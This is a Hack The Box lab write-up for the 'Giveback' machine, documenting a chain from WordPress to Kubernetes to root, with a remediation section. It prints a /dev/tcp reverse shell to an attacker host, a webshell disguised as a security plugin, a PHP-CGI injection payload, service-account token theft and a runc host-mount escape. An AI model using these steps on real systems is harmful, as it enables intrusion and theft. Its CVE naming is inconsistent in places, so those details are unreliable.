# Giveback — Hack The Box

![Giveback](../images/giveback.png)

**Machine:** Giveback  
**Difficulty:** Medium  
**OS:** Linux  
**Tags:** WordPress, GiveWP Plugin, Kubernetes, PHP-CGI, Container Escape, RBAC, runc, CVE-2024-5932, CVE-2012-1823

---

## Table of Contents

1. [Summary](#summary)
2. [Reconnaissance](#reconnaissance)
3. [Initial Foothold - WordPress Pod](#initial-foothold---wordpress-pod)
4. [Enumeration - WordPress Container](#enumeration---wordpress-container)
5. [Lateral Movement - Legacy Intranet Container](#lateral-movement---legacy-intranet-container)
6. [Privilege Escalation to User](#privilege-escalation-to-user)
7. [Privilege Escalation to Root](#privilege-escalation-to-root)
8. [Summary of Exploits](#summary-of-exploits)
9. [Remediation](#remediation)
10. [Tools](#tools)

---

## Summary

Giveback is a Medium-difficulty Linux machine that focuses on Kubernetes security, container exploitation, and privilege escalation through a custom sudo binary. After exploiting a vulnerable WordPress plugin (GiveWP) with PHP Object Injection RCE to gain initial access to the WordPress pod, I discovered an internal legacy PHP-CGI service vulnerable to CVE-2012-1823. Using Kubernetes RBAC permissions from a service account, I extracted SSH credentials from Kubernetes secrets to access the host as a regular user. Finally, I escalated to root by abusing a custom `runc` wrapper binary with sudo privileges, mounting the host root filesystem in a container to achieve full system compromise.

**Attack Path:**  
Web enumeration → WordPress GiveWP RCE → Container enumeration → Internal service discovery → Kubernetes RBAC abuse → SSH access → Custom runc exploitation → Root

---

## Reconnaissance

### Port Scanning

Initial nmap scan to discover open services:

```bash
nmap -sC -sV -p- -T4 --min-rate 5000 -oN nmap_full.txt <TARGET_IP>
```

**Results:**

```
PORT      STATE    SERVICE      VERSION
22/tcp    open     ssh          OpenSSH 8.9p1 Ubuntu 3ubuntu0.13
80/tcp    open     http         nginx 1.28.0
6443/tcp  filtered sun-sr-https
10250/tcp filtered unknown
30686/tcp open     http         Golang net/http server (Kubernetes service proxy)
```

**Key Findings:**
- Port 80: WordPress site (version 6.8.1)
- Port 6443: Kubernetes API (filtered from external access)
- Port 10250: Kubelet API (filtered)
- Port 30686: Kubernetes NodePort service proxy
- SSH open on port 22

### Web Enumeration

**WordPress Detection:**

```bash
wpscan --url http://<TARGET_IP> --enumerate p --plugins-detection aggressive
```

**Discovered:**
- GiveWP Plugin version 3.14.0 (vulnerable to CVE-2024-5932)
- WordPress version 6.8.1
- Theme: Bizberg/Green Wealth

---

## Initial Foothold - WordPress Pod

### CVE-2024-5932: GiveWP PHP Object Injection RCE

The GiveWP donation plugin version 3.14.0 is vulnerable to PHP Object Injection leading to Remote Code Execution.

**Exploitation Steps:**

1. Clone the exploit repository:

```bash
git clone https://github.com/EQSTLab/CVE-2024-8353
cd CVE-2024-8353
```

2. Start netcat listener:

```bash
nc -lvnp 4444
```

3. Execute the exploit with reverse shell payload:

```bash
python3 CVE-2024-8353.py -u http://<TARGET_IP> -c 'bash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1"'
```

**Result:** Shell as user `1001` in the WordPress pod

✅ **Initial shell obtained as www-data in WordPress container**

---

## Enumeration - WordPress Container

### WordPress Configuration

**Database Credentials:**

```bash
cat /bitnami/wordpress/wp-config.php | grep -i "define\|DB_"
```

**Found Credentials:**
- Database name, user, and host identified
- Password redacted for security

### Database Enumeration

**Extract WordPress Admin Hash:**

```bash
cat > /tmp/dbquery.php << 'EOF'
<?php
$conn = new mysqli("[DB_HOST]", "[DB_USER]", "[DB_PASSWORD]", "[DB_NAME]");
$result = $conn->query("SELECT user_login, user_pass FROM wp_users");
while($row = $result->fetch_assoc()) {
    echo $row["user_login"] . ":" . $row["user_pass"] . "\n";
}
?>
EOF

php /tmp/dbquery.php
```

**Output:**
- WordPress admin user hash extracted (redacted)

### WordPress Admin Access

**Reset Password via Database:**

```bash
cat > /tmp/resetpw.php << 'EOF'
<?php
$conn = new mysqli("[DB_HOST]", "[DB_USER]", "[DB_PASSWORD]", "[DB_NAME]");
$conn->query("UPDATE wp_users SET user_pass=MD5('[NEW_PASSWORD]') WHERE user_login='[USERNAME]'");
echo "Password reset successfully\n";
?>
EOF

php /tmp/resetpw.php
```

**Login:** `http://<TARGET_IP>/wp-admin/`
- Username: `[USERNAME]` (redacted)
- Password: `[NEW_PASSWORD]` (redacted)

### Webshell Upload via Plugin Editor

**Create Malicious Plugin:**

```bash
mkdir evil-plugin

cat > evil-plugin/evil-shell.php << 'EOF'
<?php
/*
Plugin Name: Security Scanner
Description: Security enhancement plugin
Version: 1.0
Author: Admin
*/

if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
EOF

zip evil-plugin.zip evil-plugin/evil-shell.php
```

**Upload via WordPress:**
1. Plugins → Add New → Upload Plugin
2. Upload `evil-plugin.zip`
3. Activate the plugin

**Test Webshell:**

```bash
curl "http://<TARGET_IP>/wp-content/plugins/evil-plugin/evil-shell.php?cmd=id"
# Output: uid=1001 gid=0(root) groups=0(root),1001
```

---

## Lateral Movement - Legacy Intranet Container

### Internal Service Discovery

**Check Environment Variables:**

```bash
curl "http://<TARGET_IP>/wp-content/plugins/evil-plugin/evil-shell.php?cmd=env" | grep SERVICE
```

**Found Internal Services:**
- Legacy intranet service on internal cluster IP
- Kubernetes service host and port identified

### CVE-2012-1823: PHP-CGI Argument Injection

The legacy intranet service runs vulnerable PHP-CGI on an internal cluster IP.

**Test RCE:**

```bash
curl "http://<TARGET_IP>/wp-content/plugins/evil-plugin/evil-shell.php" \
  --data-urlencode 'cmd=curl "http://[INTERNAL_IP]:[PORT]/index.php?-d+allow_url_include=1+-d+auto_prepend_file=php://input" --data-binary "<?php system(\"id\"); ?>"'
```

**Note:** This gives blind RCE (HTTP 200 but no output visible). However, the service runs in a **different container** with Kubernetes service account tokens.

---

## Privilege Escalation to User

### Kubernetes Secret Enumeration

The **legacy-intranet-cms container** has a Kubernetes service account (`secret-reader-sa`) with permissions to read secrets in the default namespace.

**Service Account Credentials** (from legacy container):
- **Token:** Located at `/run/secrets/kubernetes.io/serviceaccount/token`
- **CA Certificate:** Located at `/run/secrets/kubernetes.io/serviceaccount/ca.crt`
- **Namespace:** `default`
- **Service Account:** `secret-reader-sa`

### Query Kubernetes API for Secrets

**From WordPress Pod (using PHP):**

```bash
php -r '
$token = file_get_contents("/run/secrets/kubernetes.io/serviceaccount/token");

$context = stream_context_create(array(
    "http" => array(
        "header" => "Authorization: Bearer $token",
        "ignore_errors" => true
    ),
    "ssl" => array(
        "verify_peer" => false,
        "verify_peer_name" => false
    )
));

$response = file_get_contents("https://[KUBERNETES_API]/api/v1/namespaces/default/secrets/[SECRET_NAME]", false, $context);
echo $response;
'
```

**Response (JSON):**
- Secret data extracted (base64 encoded password redacted)

### Decode SSH Password

```bash
echo "[BASE64_ENCODED_PASSWORD]" | base64 -d
# Output: [REDACTED_PASSWORD]
```

### SSH Access

```bash
ssh [USERNAME]@<TARGET_IP>
# Password: [REDACTED_PASSWORD]
```

**User Flag:**

```bash
cat ~/user.txt
# HTB{redacted}
```

✅ **User flag captured**

---

## Privilege Escalation to Root

### Sudo Privileges

```bash
sudo -l
```

**Output:**

```
User [USERNAME] may run the following commands on localhost:
    (ALL) NOPASSWD: !ALL
    (ALL) /opt/debug
```

### Analyzing /opt/debug

```bash
file /opt/debug
# /opt/debug: ELF 64-bit LSB executable
```

**Execution:**

```bash
sudo /opt/debug
# Prompts for:
# 1. Sudo password (user's SSH password)
# 2. Administrative password
```

**Administrative Password:** The administrative password is the **base64-encoded MariaDB password** from `wp-config.php`.

```bash
echo -n "[DB_PASSWORD]" | base64
# [BASE64_ENCODED_DB_PASSWORD]
```

**Execute:**

```bash
sudo /opt/debug
# Sudo password: [USER_PASSWORD] (redacted)
# Administrative password: [BASE64_ENCODED_DB_PASSWORD] (redacted)
```

**Result:** The binary is actually `runc` (container runtime) - confirmed by the help output showing runc commands.

### runc Container Escape

**Create Container Bundle:**

```bash
cd ~
mkdir -p mycontainer/rootfs
cd mycontainer

# Generate default config
sudo /opt/debug spec
# Enter passwords when prompted
```

**Create Minimal Rootfs:**

```bash
cd rootfs
mkdir -p bin lib lib64
cp /bin/sh /bin/ls /bin/cat bin/
ldd /bin/sh | grep -o '/lib[^ ]*' | xargs -I {} cp {} lib/
cd ..
```

**Modify config.json to Mount Host Root:**

```bash
cat config.json | python3 -c "
import sys, json
config = json.load(sys.stdin)
config['mounts'].append({
    'type': 'bind',
    'source': '/root',
    'destination': '/my-root',
    'options': ['rbind', 'rw']
})
print(json.dumps(config, indent=4))
" > config_new.json

mv config_new.json config.json
```

**Verify Mount Configuration:**

```bash
grep -A 6 '"/my-root"' config.json
```

**Run Container:**

```bash
sudo /opt/debug run mycontainer
# Enter passwords when prompted
```

**Inside Container - Access Host Root:**

```bash
cat /my-root/root.txt
# HTB{redacted}
```

✅ **Root flag captured**

Alternatively, you can spawn a shell as host root:

```bash
chroot /my-root /bin/bash
id
# uid=0(root) gid=0(root)
```

---

## Summary of Exploits

| Stage | Vulnerability | Technique | Result |
|-------|---------------|-----------|--------|
| 1 | CVE-2024-5932: GiveWP Plugin | PHP Object Injection RCE | Shell in WordPress pod |
| 2 | WordPress Database | Credential extraction | Admin access to WordPress |
| 3 | File Upload | Malicious plugin upload | Persistent webshell |
| 4 | CVE-2012-1823: PHP-CGI | Argument injection | Blind RCE in legacy container |
| 5 | Kubernetes RBAC | Service account token abuse | Secret enumeration |
| 6 | Weak Secret Management | SSH credentials in K8s secrets | User access to host |
| 7 | Custom sudo binary | `/opt/debug` (runc wrapper) | Container runtime access |
| 8 | Container Escape | runc filesystem mount | Root access on host |

---

## Remediation

### Critical Security Issues

1. **CVE-2024-5932: GiveWP Plugin RCE**
   - Update GiveWP plugin to the latest patched version immediately
   - Implement Web Application Firewall (WAF) rules to detect PHP object injection patterns
   - Regularly scan and update all WordPress plugins
   - Remove unused or deprecated plugins
   - Subscribe to security advisories for installed plugins

2. **Weak WordPress Credentials & Password Storage**
   - Enforce strong password policies for all WordPress users
   - Implement two-factor authentication (2FA) for admin accounts
   - Use strong password hashing algorithms (bcrypt, Argon2)
   - Regularly audit user accounts and remove inactive users
   - Implement account lockout policies after failed login attempts

3. **File Upload Vulnerabilities**
   - Implement strict file upload validation (content-type, magic bytes, file extensions)
   - Block executable file types from upload directories
   - Store uploads outside the web root or in protected directories
   - Use allow-lists instead of deny-lists for file uploads
   - Implement file integrity monitoring

4. **Legacy Service Exposure (PHP-CGI CVE-2012-1823)**
   - Remove or update legacy PHP-CGI services
   - Use modern PHP-FPM instead of deprecated PHP-CGI
   - Implement network segmentation to isolate legacy services
   - Apply web server configurations to block CGI parameter injection
   - Conduct regular vulnerability scans on internal services

5. **Kubernetes RBAC Misconfiguration**
   - Follow principle of least privilege for service accounts
   - Avoid granting broad `secret-reader` permissions
   - Use namespace isolation for different applications
   - Implement Pod Security Policies/Standards
   - Regularly audit RBAC configurations
   - Use tools like `kube-bench` and `kube-hunter` for security assessments

6. **Weak Secret Management**
   - Never store credentials in plain text or base64 encoding
   - Use external secret management solutions (HashiCorp Vault, AWS Secrets Manager)
   - Implement secret rotation policies
   - Use Kubernetes external secrets operators
   - Encrypt secrets at rest with KMS
   - Audit secret access regularly

7. **Sudo Misconfiguration & Custom Binaries**
   - Review all sudo rules regularly
   - Avoid NOPASSWD for sensitive binaries
   - Implement proper authentication for custom sudo wrappers
   - Use `NOEXEC` flag where applicable
   - Audit custom binaries for security vulnerabilities
   - Follow least privilege principle

8. **Container Runtime Security (runc)**
   - Restrict access to container runtime binaries
   - Implement AppArmor/SELinux policies for containers
   - Use runtime security monitoring (Falco, Sysdig)
   - Prevent privileged container creation
   - Use user namespaces to limit container capabilities
   - Regularly update container runtimes

### Security Best Practices

- **Network Segmentation:** Isolate container networks from host networks
- **Monitoring & Logging:** Implement comprehensive logging for Kubernetes API, container activities, and authentication attempts
- **Regular Updates:** Keep all software components up to date (WordPress, plugins, Kubernetes, container runtimes)
- **Security Scanning:** Implement automated vulnerability scanning in CI/CD pipelines
- **Incident Response:** Develop and test incident response procedures for container compromises
- **Defense in Depth:** Implement multiple layers of security controls
- **Penetration Testing:** Conduct regular security assessments and penetration tests

---

## Tools

| Tool | Purpose |
|------|---------|
| `nmap` | Port scanning and service enumeration |
| `wpscan` | WordPress vulnerability scanning |
| `curl` | HTTP requests and API interactions |
| `netcat` | Reverse shell listener |
| `base64` | Encoding/decoding credentials |
| `python3` | JSON manipulation and scripting |
| `php` | Kubernetes API interaction and database queries |
| `ssh` | Remote access |
| `runc` | Container runtime (via `/opt/debug`) |

---

## References

- [CVE-2024-5932: GiveWP Plugin RCE](https://github.com/EQSTLab/CVE-2024-8353)
- [CVE-2012-1823: PHP-CGI Argument Injection](https://www.exploit-db.com/exploits/18836)
- [Kubernetes RBAC Documentation](https://kubernetes.io/docs/reference/access-authn-authz/rbac/)
- [runc Container Runtime](https://github.com/opencontainers/runc)
- [Container Escape Techniques](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation)

---

**Author:** Erviano Florentino Susanto  
**Platform:** Hack The Box  
**Date:** November 2025  
**Flags:** User `HTB{redacted}`, Root `HTB{redacted}`

---

*This writeup is for educational purposes only. Always obtain proper authorization before testing security vulnerabilities.*
